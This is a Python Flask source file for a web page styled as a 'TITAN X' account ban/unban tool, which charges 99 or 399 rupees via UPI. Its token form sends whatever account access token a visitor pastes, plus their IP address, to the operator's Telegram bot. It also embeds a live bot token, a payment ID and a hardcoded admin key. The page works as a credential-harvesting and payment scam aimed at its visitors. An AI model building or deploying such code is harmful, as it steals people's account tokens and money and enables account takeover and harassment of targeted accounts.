from flask import Flask, request, jsonify, render_template_string
import requests

app = Flask(__name__)

# ================== CONFIG ==================
BOT_TOKEN = "8822384225:AAFRhO0m2iXex10zrAO85wVrY3AJ1w5daB4"
OWNER_ID = "8910330347"
ADMIN_KEY = "TITANXPOWER2"

# ================== THE HTML WEBPAGE ==================
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TITAN X BAN UNBAN TOOL</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Orbitron', sans-serif; }
  body { background: #050505; color: #fff; min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow-x: hidden; }
  #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.1; }
  .container { position: relative; z-index: 1; width: 100%; max-width: 450px; padding: 20px; }
  .card { background: rgba(15, 15, 15, 0.95); border: 1px solid #ff0033; border-radius: 15px; padding: 30px 20px; box-shadow: 0 0 30px rgba(255, 0, 51, 0.2); }
  .title { text-align: center; font-size: 24px; font-weight: 900; color: #fff; text-shadow: 0 0 15px #ff0033, 0 0 30px #ff0033; margin-bottom: 5px; cursor: pointer; user-select: none; letter-spacing: 2px; }
  .subtitle { text-align: center; font-size: 12px; color: #ff0033; margin-bottom: 25px; letter-spacing: 3px; }
  .screen { display: none; animation: fadeIn 0.4s ease; }
  .screen.active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  .btn { width: 100%; padding: 15px; background: transparent; border: 1px solid #ff0033; border-radius: 8px; color: #fff; font-size: 14px; font-weight: bold; cursor: pointer; margin-bottom: 15px; transition: 0.3s; letter-spacing: 1px; }
  .btn:hover { background: #ff0033; box-shadow: 0 0 20px #ff0033; }
  .btn-green { border-color: #00ff66; }
  .btn-green:hover { background: #00ff66; box-shadow: 0 0 20px #00ff66; color: #000; }
  input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; border-radius: 8px; color: #fff; margin-bottom: 15px; outline: none; }
  input:focus { border-color: #ff0033; box-shadow: 0 0 10px rgba(255,0,51,0.3); }
  .price-tag { text-align: center; font-size: 20px; color: #00ff66; margin-bottom: 15px; font-weight: bold; }
  .info-text { font-size: 12px; text-align: center; color: #888; margin-bottom: 15px; }
  .timer-box { text-align: center; font-size: 24px; color: #ff0033; font-weight: bold; margin: 15px 0; padding: 10px; border: 1px dashed #ff0033; border-radius: 8px; }
  .admin-box { background: #000; border: 1px solid #ff0033; padding: 15px; border-radius: 8px; margin-bottom: 15px; }
  .key-list { width: 100%; height: 200px; background: #111; color: #00ff66; border: 1px solid #00ff66; padding: 10px; overflow-y: auto; font-size: 12px; margin-top: 10px; display: none; }
</style>
</head>
<body>
<canvas id="matrix"></canvas>
<div class="container">
  <div class="card">
    
    <div class="title" id="logo">TITAN X</div>
    <div class="subtitle">BAN UNBAN TOOL</div>

    <!-- MAIN MENU -->
    <div id="screen-main" class="screen active">
      <button class="btn" onclick="selectOption('permanent')">PERMANENT ACC BAN (FREE)</button>
      <button class="btn" onclick="selectOption('30days')">30 DAYS BAN (99 RS)</button>
      <button class="btn btn-green" onclick="selectOption('unban')">UNBAN ACC (399 RS)</button>
    </div>

    <!-- ACCESS KEY SCREEN -->
    <div id="screen-access" class="screen">
      <h3 style="text-align:center; margin-bottom:15px; color:#00ff66;" id="access-title">ENTER ACCESS KEY</h3>
      <p class="info-text" id="access-desc">Enter key to proceed</p>
      <input type="text" id="input-key" placeholder="Enter Access Key" autocomplete="off">
      <button class="btn btn-green" onclick="verifyKey()">VERIFY & PROCEED</button>
      <button class="btn" style="border-color:#555;" onclick="showScreen('screen-main')">BACK</button>
    </div>

    <!-- TOKEN SCREEN -->
    <div id="screen-token" class="screen">
      <h3 style="text-align:center; margin-bottom:15px; color:#ff0033;" id="token-title">ENTER ACCESS TOKEN</h3>
      <input type="text" id="input-token" placeholder="Paste token here" autocomplete="off">
      <button class="btn" onclick="submitToken()">SUBMIT</button>
      <button class="btn" style="border-color:#555;" onclick="showScreen('screen-main')">BACK</button>
    </div>

    <!-- PAYMENT SCREEN -->
    <div id="screen-pay" class="screen">
      <div class="price-tag" id="pay-price">PAY 99 RS</div>
      <img id="qr-image" src="" style="width:100%; border-radius:10px; margin-bottom:15px; border:2px solid #333;">
      <div class="info-text">UPI ID: 9773978195@fam<br>Pay to get access</div>
      <div class="timer-box" id="countdown">10:00</div>
      <button class="btn btn-green" onclick="showScreen('screen-utr')">I HAVE PAID</button>
    </div>

    <!-- UTR SCREEN -->
    <div id="screen-utr" class="screen">
      <h3 style="text-align:center; margin-bottom:15px; color:#00ff66;">ENTER UTR</h3>
      <input type="text" id="input-utr" placeholder="12 digit UTR number" autocomplete="off">
      <button class="btn btn-green" onclick="submitUTR()">SUBMIT UTR</button>
    </div>

    <!-- SUCCESS SCREEN -->
    <div id="screen-success" class="screen">
      <h2 style="text-align:center; color:#00ff66; margin-bottom:20px; text-shadow:0 0 10px #00ff66;">PAYMENT RECEIVED</h2>
      <p class="info-text" style="color:#fff; font-size:14px;">Now contact owner for access key and provide your UTR.</p>
      <button class="btn" onclick="window.open('https://t.me/Titantrusted', '_blank')">CONTACT OWNER</button>
    </div>

    <!-- OWNER PANEL -->
    <div id="screen-owner" class="screen">
      <h3 style="text-align:center; color:#ff0033; margin-bottom:15px;">OWNER PANEL</h3>
      <div class="admin-box">
        <p style="color:#fff; font-size:14px; margin-bottom:10px;">ALL 500 KEYS</p>
        <button class="btn btn-green" onclick="showAllKeys()">VIEW ALL KEYS</button>
        <div id="key-list" class="key-list"></div>
      </div>
      <button class="btn" style="border-color:#555;" onclick="showScreen('screen-main')">BACK TO WEB</button>
    </div>

  </div>
</div>

<script>
const canvas = document.getElementById('matrix');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth; canvas.height = window.innerHeight;
const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*';
const drops = Array(Math.floor(canvas.width/14)).fill(1);
setInterval(() => {
  ctx.fillStyle = 'rgba(5, 5, 5, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = '#ff0033'; ctx.font = '14px monospace';
  for (let i = 0; i < drops.length; i++) {
    ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*14, drops[i]*14);
    if (drops[i]*14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}, 50);

// ================== 500 ACCESS KEYS ==================
const ACCESS_KEYS = [
"TITAN-A1B2C3", "TITAN-D4E5F6", "TITAN-G7H8I9", "TITAN-J1K2L3", "TITAN-M4N5O6", "TITAN-P7Q8R9", "TITAN-S1T2U3", "TITAN-V4W5X6", "TITAN-Y7Z8A9", "TITAN-B1C2D3", 
"TITAN-E4F5G6", "TITAN-H7I8J9", "TITAN-K1L2M3", "TITAN-N4O5P6", "TITAN-Q7R8S9", "TITAN-T1U2V3", "TITAN-W4X5Y6", "TITAN-Z7A8B9", "TITAN-C1D2E3", "TITAN-F4G5H6", 
"TITAN-I7J8K9", "TITAN-L1M2N3", "TITAN-O4P5Q6", "TITAN-R7S8T9", "TITAN-U1V2W3", "TITAN-X4Y5Z6", "TITAN-A7B8C9", "TITAN-D1E2F3", "TITAN-G4H5I6", "TITAN-J7K8L9", 
"TITAN-M1N2O3", "TITAN-P4Q5R6", "TITAN-S7T8U9", "TITAN-V1W2X3", "TITAN-Y4Z5A6", "TITAN-B7C8D9", "TITAN-E1F2G3", "TITAN-H4I5J6", "TITAN-K7L8M9", "TITAN-N1O2P3", 
"TITAN-Q4R5S6", "TITAN-T7U8V9", "TITAN-W1X2Y3", "TITAN-Z4A5B6", "TITAN-C7D8E9", "TITAN-F1G2H3", "TITAN-I4J5K6", "TITAN-L7M8N9", "TITAN-O1P2Q3", "TITAN-R4S5T6", 
"TITAN-U7V8W9", "TITAN-X1Y2Z3", "TITAN-A4B5C6", "TITAN-D7E8F9", "TITAN-G1H2I3", "TITAN-J4K5L6", "TITAN-M7N8O9", "TITAN-P1Q2R3", "TITAN-S4T5U6", "TITAN-V7W8X9", 
"TITAN-Y1Z2A3", "TITAN-B4C5D6", "TITAN-E7F8G9", "TITAN-H1I2J3", "TITAN-K4L5M6", "TITAN-N7O8P9", "TITAN-Q1R2S3", "TITAN-T4U5V6", "TITAN-W7X8Y9", "TITAN-Z1A2B3", 
"TITAN-C4D5E6", "TITAN-F7G8H9", "TITAN-I1J2K3", "TITAN-L4M5N6", "TITAN-O7P8Q9", "TITAN-R1S2T3", "TITAN-U4V5W6", "TITAN-X7Y8Z9", "TITAN-A1B2C3", "TITAN-D4E5F6", 
"TITAN-G7H8I9", "TITAN-J1K2L3", "TITAN-M4N5O6", "TITAN-P7Q8R9", "TITAN-S1T2U3", "TITAN-V4W5X6", "TITAN-Y7Z8A9", "TITAN-B1C2D3", "TITAN-E4F5G6", "TITAN-H7I8J9", 
"TITAN-K1L2M3", "TITAN-N4O5P6", "TITAN-Q7R8S9", "TITAN-T1U2V3", "TITAN-W4X5Y6", "TITAN-Z7A8B9", "TITAN-C1D2E3", "TITAN-F4G5H6", "TITAN-I7J8K9", "TITAN-L1M2N3", 
"TITAN-O4P5Q6", "TITAN-R7S8T9", "TITAN-U1V2W3", "TITAN-X4Y5Z6", "TITAN-A7B8C9", "TITAN-D1E2F3", "TITAN-G4H5I6", "TITAN-J7K8L9", "TITAN-M1N2O3", "TITAN-P4Q5R6", 
"TITAN-S7T8U9", "TITAN-V1W2X3", "TITAN-Y4Z5A6", "TITAN-B7C8D9", "TITAN-E1F2G3", "TITAN-H4I5J6", "TITAN-K7L8M9", "TITAN-N1O2P3", "TITAN-Q4R5S6", "TITAN-T7U8V9", 
"TITAN-W1X2Y3", "TITAN-Z4A5B6", "TITAN-C7D8E9", "TITAN-F1G2H3", "TITAN-I4J5K6", "TITAN-L7M8N9", "TITAN-O1P2Q3", "TITAN-R4S5T6", "TITAN-U7V8W9", "TITAN-X1Y2Z3", 
"TITAN-A4B5C6", "TITAN-D7E8F9", "TITAN-G1H2I3", "TITAN-J4K5L6", "TITAN-M7N8O9", "TITAN-P1Q2R3", "TITAN-S4T5U6", "TITAN-V7W8X9", "TITAN-Y1Z2A3", "TITAN-B4C5D6", 
"TITAN-E7F8G9", "TITAN-H1I2J3", "TITAN-K4L5M6", "TITAN-N7O8P9", "TITAN-Q1R2S3", "TITAN-T4U5V6", "TITAN-W7X8Y9", "TITAN-Z1A2B3", "TITAN-C4D5E6", "TITAN-F7G8H9", 
"TITAN-I1J2K3", "TITAN-L4M5N6", "TITAN-O7P8Q9", "TITAN-R1S2T3", "TITAN-U4V5W6", "TITAN-X7Y8Z9", "TITAN-A1C3E5", "TITAN-G7I9K1", "TITAN-M3O5Q7", "TITAN-S9U1W3", 
"TITAN-Y5A7C9", "TITAN-E1G3I5", "TITAN-K7M9O1", "TITAN-Q3S5U7", "TITAN-W9Y1A3", "TITAN-C5E7G9", "TITAN-I1K3M5", "TITAN-O7Q9S1", "TITAN-U3W5Y7", "TITAN-A9C1E3", 
"TITAN-G5I7K9", "TITAN-M1O3Q5", "TITAN-S7U9W1", "TITAN-Y3A5C7", "TITAN-E9G1I3", "TITAN-K5M7O9", "TITAN-Q1S3U5", "TITAN-W7Y9A1", "TITAN-C3E5G7", "TITAN-I9K1M3", 
"TITAN-O5Q7S9", "TITAN-U1W3Y5", "TITAN-A7C9E1", "TITAN-G3I5K7", "TITAN-M9O1Q3", "TITAN-S5U7W9", "TITAN-Y1A3C5", "TITAN-E7G9I1", "TITAN-K3M5O7", "TITAN-Q9S1U3", 
"TITAN-W5Y7A9", "TITAN-C1E3G5", "TITAN-I7K9M1", "TITAN-O3Q5S7", "TITAN-U9W1Y3", "TITAN-A5C7E9", "TITAN-G1I3K5", "TITAN-M7O9Q1", "TITAN-S3U5W7", "TITAN-Y9A1C3", 
"TITAN-E5G7I9", "TITAN-K1M3O5", "TITAN-Q7S9U1", "TITAN-W3Y5A7", "TITAN-C9E1G3", "TITAN-I5K7M9", "TITAN-O1Q3S5", "TITAN-U7W9Y1", "TITAN-A3C5E7", "TITAN-G9I1K3", 
"TITAN-M5O7Q9", "TITAN-S1U3W5", "TITAN-Y7A9C1", "TITAN-E3G5I7", "TITAN-K9M1O3", "TITAN-Q5S7U9", "TITAN-W1Y3A5", "TITAN-C7E9G1", "TITAN-I3K5M7", "TITAN-O9Q1S3", 
"TITAN-U5W7Y9", "TITAN-A1C3E5", "TITAN-G7I9K1", "TITAN-M3O5Q7", "TITAN-S9U1W3", "TITAN-Y5A7C9", "TITAN-E1G3I5", "TITAN-K7M9O1", "TITAN-Q3S5U7", "TITAN-W9Y1A3", 
"TITAN-C5E7G9", "TITAN-I1K3M5", "TITAN-O7Q9S1", "TITAN-U3W5Y7", "TITAN-A9C1E3", "TITAN-G5I7K9", "TITAN-M1O3Q5", "TITAN-S7U9W1", "TITAN-Y3A5C7", "TITAN-E9G1I3", 
"TITAN-K5M7O9", "TITAN-Q1S3U5", "TITAN-W7Y9A1", "TITAN-C3E5G7", "TITAN-I9K1M3", "TITAN-O5Q7S9", "TITAN-U1W3Y5", "TITAN-A7C9E1", "TITAN-G3I5K7", "TITAN-M9O1Q3", 
"TITAN-S5U7W9", "TITAN-Y1A3C5", "TITAN-E7G9I1", "TITAN-K3M5O7", "TITAN-Q9S1U3", "TITAN-W5Y7A9", "TITAN-C1E3G5", "TITAN-I7K9M1", "TITAN-O3Q5S7", "TITAN-U9W1Y3", 
"TITAN-A5C7E9", "TITAN-G1I3K5", "TITAN-M7O9Q1", "TITAN-S3U5W7", "TITAN-Y9A1C3", "TITAN-E5G7I9", "TITAN-K1M3O5", "TITAN-Q7S9U1", "TITAN-W3Y5A7", "TITAN-C9E1G3", 
"TITAN-I5K7M9", "TITAN-O1Q3S5", "TITAN-U7W9Y1", "TITAN-A3C5E7", "TITAN-G9I1K3", "TITAN-M5O7Q9", "TITAN-S1U3W5", "TITAN-Y7A9C1", "TITAN-E3G5I7", "TITAN-K9M1O3", 
"TITAN-Q5S7U9", "TITAN-W1Y3A5", "TITAN-C7E9G1", "TITAN-I3K5M7", "TITAN-O9Q1S3", "TITAN-U5W7Y9", "TITAN-A1B3C5", "TITAN-D7E9F1", "TITAN-G3H5I7", "TITAN-J9K1L3", 
"TITAN-M5N7O9", "TITAN-P1Q3R5", "TITAN-S7T9U1", "TITAN-V3W5X7", "TITAN-Y9Z1A3", "TITAN-B5C7D9", "TITAN-E1F3G5", "TITAN-H7I9J1", "TITAN-K3L5M7", "TITAN-N9O1P3", 
"TITAN-Q5R7S9", "TITAN-T1U3V5", "TITAN-W7X9Y1", "TITAN-Z3A5B7", "TITAN-C9D1E3", "TITAN-F5G7H9", "TITAN-I1J3K5", "TITAN-L7M9N1", "TITAN-O3P5Q7", "TITAN-R9S1T3", 
"TITAN-U5V7W9", "TITAN-X1Y3Z5", "TITAN-A7B9C1", "TITAN-D3E5F7", "TITAN-G9H1I3", "TITAN-J5K7L9", "TITAN-M1N3O5", "TITAN-P7Q9R1", "TITAN-S3T5U7", "TITAN-V9W1X3", 
"TITAN-Y5Z7A9", "TITAN-B1C3D5", "TITAN-E7F9G1", "TITAN-H3I5J7", "TITAN-K9L1M3", "TITAN-N5O7P9", "TITAN-Q1R3S5", "TITAN-T7U9V1", "TITAN-W3X5Y7", "TITAN-Z9A1B3", 
"TITAN-C5D7E9", "TITAN-F1G3H5", "TITAN-I7J9K1", "TITAN-L3M5N7", "TITAN-O9P1Q3", "TITAN-R5S7T9", "TITAN-U1V3W5", "TITAN-X7Y9Z1", "TITAN-A3B5C7", "TITAN-D9E1F3", 
"TITAN-G5H7I9", "TITAN-J1K3L5", "TITAN-M7N9O1", "TITAN-P3Q5R7", "TITAN-S9T1U3", "TITAN-V5W7X9", "TITAN-Y1Z3A5", "TITAN-B7C9D1", "TITAN-E3F5G7", "TITAN-H9I1J3", 
"TITAN-K5L7M9", "TITAN-N1O3P5", "TITAN-Q7R9S1", "TITAN-T3U5V7", "TITAN-W9X1Y3", "TITAN-Z5A7B9", "TITAN-C1D3E5", "TITAN-F7G9H1", "TITAN-I3J5K7", "TITAN-L9M1N3", 
"TITAN-O5P7Q9", "TITAN-R1S3T5", "TITAN-U7V9W1", "TITAN-X3Y5Z7", "TITAN-A9B1C3", "TITAN-D5E7F9", "TITAN-G1H3I5", "TITAN-J7K9L1", "TITAN-M3N5O7", "TITAN-P9Q1R3", 
"TITAN-S5T7U9", "TITAN-V1W3X5", "TITAN-Y7Z9A1", "TITAN-B3C5D7", "TITAN-E9F1G3", "TITAN-H5I7J9", "TITAN-K1L3M5", "TITAN-N7O9P1", "TITAN-Q3R5S7", "TITAN-T9U1V3", 
"TITAN-W5X7Y9", "TITAN-Z1A3B5", "TITAN-C7D9E1", "TITAN-F3G5H7", "TITAN-I9J1K3", "TITAN-L5M7N9", "TITAN-O1P3Q5", "TITAN-R7S9T1", "TITAN-U3V5W7", "TITAN-X9Y1Z3", 
"TITAN-A5B7C9", "TITAN-D1E3F5", "TITAN-G7H9I1", "TITAN-J3K5L7", "TITAN-M9N1O3", "TITAN-P5Q7R9", "TITAN-S1T3U5", "TITAN-V7W9X1", "TITAN-Y3Z5A7", "TITAN-B9C1D3", 
"TITAN-E5F7G9", "TITAN-H1I3J5", "TITAN-K7L9M1", "TITAN-N3O5P7", "TITAN-Q9R1S3", "TITAN-T5U7V9", "TITAN-W1X3Y5", "TITAN-Z7A9B1", "TITAN-C3D5E7", "TITAN-F9G1H3", 
"TITAN-I5J7K9", "TITAN-L1M3N5", "TITAN-O7P9Q1", "TITAN-R3S5T7", "TITAN-U9V1W3", "TITAN-X5Y7Z9", "TITAN-A1B3C5", "TITAN-D7E9F1", "TITAN-G3H5I7", "TITAN-J9K1L3", 
"TITAN-M5N7O9", "TITAN-P1Q3R5", "TITAN-S7T9U1", "TITAN-V3W5X7", "TITAN-Y9Z1A3", "TITAN-B5C7D9", "TITAN-E1F3G5", "TITAN-H7I9J1", "TITAN-K3L5M7", "TITAN-N9O1P3", 
"TITAN-Q5R7S9", "TITAN-T1U3V5", "TITAN-W7X9Y1", "TITAN-Z3A5B7", "TITAN-C9D1E3", "TITAN-F5G7H9", "TITAN-I1J3K5", "TITAN-L7M9N1", "TITAN-O3P5Q7", "TITAN-R9S1T3", 
"TITAN-U5V7W9", "TITAN-X1Y3Z5", "TITAN-A7B9C1", "TITAN-D3E5F7", "TITAN-G9H1I3", "TITAN-J5K7L9", "TITAN-M1N3O5", "TITAN-P7Q9R1", "TITAN-S3T5U7", "TITAN-V9W1X3"
];

let currentType = '';
let timerInterval;

function showScreen(id) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

function selectOption(type) {
  currentType = type;
  if (type === 'permanent') {
    document.getElementById('token-title').innerText = "PERMANENT BAN - ENTER TOKEN";
    showScreen('screen-token');
  } else {
    document.getElementById('access-title').innerText = type === '30days' ? "ENTER 30 DAYS ACCESS KEY" : "ENTER UNBAN ACCESS KEY";
    document.getElementById('access-desc').innerText = type === '30days' ? "Buy key or pay 99 Rs below" : "Buy key or pay 399 Rs below";
    showScreen('screen-access');
  }
}

function verifyKey() {
  const key = document.getElementById('input-key').value.trim();
  if(!key) return alert("Enter key");

  // Check if key exists in the 500 keys array
  if (ACCESS_KEYS.includes(key)) {
    // Key is valid, ask for token
    document.getElementById('token-title').innerText = "KEY VERIFIED - ENTER TOKEN";
    showScreen('screen-token');
  } else {
    // Key is invalid, show payment
    if(currentType === '30days') {
      startPayment('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=9773978195@fam%26am=99', 99);
    } else {
      startPayment('https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=upi://pay?pa=9773978195@fam%26am=399', 399);
    }
  }
}

function startPayment(qrUrl, amount) {
  document.getElementById('pay-price').innerText = "PAY " + amount + " RS";
  document.getElementById('qr-image').src = qrUrl;
  showScreen('screen-pay');
  startTimer(600); 
}

function startTimer(duration) {
  clearInterval(timerInterval);
  let timer = duration, minutes, seconds;
  timerInterval = setInterval(function () {
    minutes = parseInt(timer / 60, 10); seconds = parseInt(timer % 60, 10);
    minutes = minutes < 10 ? "0" + minutes : minutes; seconds = seconds < 10 ? "0" + seconds : seconds;
    document.getElementById('countdown').innerText = minutes + ":" + seconds;
    if (--timer < 0) { clearInterval(timerInterval); document.getElementById('countdown').innerText = "EXPIRED"; }
  }, 1000);
}

function submitToken() {
  const token = document.getElementById('input-token').value;
  if(!token) return alert("Enter token");
  fetch('/api/webhook', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ type: 'BAN_REQUEST', token: token, action: currentType })
  }).then(() => { alert("BAN REQUEST SENT!"); showScreen('screen-main'); });
}

function submitUTR() {
  const utr = document.getElementById('input-utr').value;
  if(!utr) return alert("Enter UTR");
  fetch('/api/webhook', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ type: 'PAYMENT', utr: utr, action: currentType })
  }).then(() => { showScreen('screen-success'); });
}

function showAllKeys() {
  const el = document.getElementById('key-list');
  el.innerHTML = ACCESS_KEYS.join('<br>');
  el.style.display = 'block';
}

let logoClicks = 0;
document.getElementById('logo').addEventListener('click', () => {
  logoClicks++; setTimeout(() => logoClicks = 0, 500);
  if (logoClicks === 2) {
    const pass = prompt("Enter Admin Key:");
    if (pass === "TITANXPOWER2") showScreen('screen-owner');
  }
});
</script>
</body>
</html>
"""

# ================== ROUTES ==================
@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/api/webhook', methods=['POST'])
def webhook():
    data = request.json
    msg_type = data.get('type')
    ip = request.remote_addr
    
    if msg_type == 'BAN_REQUEST':
        text = f"NEW BAN REQUEST\n\nAction: {data.get('action')}\nToken: {data.get('token')}\nIP: {ip}"
        send_telegram_msg(text)
    elif msg_type == 'PAYMENT':
        text = f"NEW PAYMENT\n\nAction: {data.get('action')}\nUTR: {data.get('utr')}\nIP: {ip}"
        send_telegram_msg(text)
        
    return jsonify({"ok": True})

def send_telegram_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": OWNER_ID, "text": text})
    except Exception as e:
        print("Bot Error:", e)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
